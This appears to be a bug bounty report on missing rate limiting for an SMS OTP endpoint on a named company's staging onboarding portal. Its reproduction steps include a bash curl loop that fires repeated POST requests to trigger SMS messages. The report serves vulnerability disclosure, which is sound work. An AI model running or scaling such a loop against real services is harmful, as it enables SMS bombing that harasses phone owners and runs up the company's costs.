# Missing Rate Limiting on SMS OTP Generation Endpoint

## Summary
The Greenlight onboarding portal lacks rate limiting on the SMS OTP generation endpoint (`/onboarding/phone-number`). This allows an unauthenticated attacker to send an unlimited number of SMS messages to any phone number, leading to SMS bombing, user harassment, and financial loss for Greenlight due to SMS gateway costs.

## Vulnerability Type
- CWE-770: Allocation of Resources Without Limits or Throttling
- Business Logic Flaw / Denial of Service (SMS Flooding)

## Severity
**P3 (Medium)** - Due to financial impact and user harassment potential.

## Affected Component
- Target: `https://onboarding.stage.greenlight.gl-tech.io`
- Endpoint: `POST /onboarding/phone-number?_data=routes%2Fonboarding_.phone-number`

## Steps to Reproduce
1. Navigate to `https://onboarding.stage.greenlight.gl-tech.io/onboarding/phone-number`.
2. Open Developer Tools (F12) -> Network tab.
3. Enter a dummy phone number (e.g., `112-233-4455`) and click "Next".
4. Capture the `POST` request in the Network tab.
5. Copy the request as a `cURL` command.
6. Execute the `cURL` command in a terminal to verify the `HTTP 204` response.
7. Execute the following bash loop to bypass the UI and send multiple requests in rapid succession:

```bash
for i in {1..9}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" 'https://onboarding.stage.greenlight.gl-tech.io/onboarding/phone-number?_data=routes%2Fonboarding_.phone-number' \
    -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' \
    -H 'Origin: https://onboarding.stage.greenlight.gl-tech.io' \
    -H 'Cookie: __onboarding-session-staging=[VALID_SESSION_COOKIE]' \
    --data-raw "__rvfInternalFormId=%3AR38p%3A&csrf_token=[VALID_CSRF_TOKEN]&phoneNumber=(112)+233-44${i}0"
  sleep 0.5
done
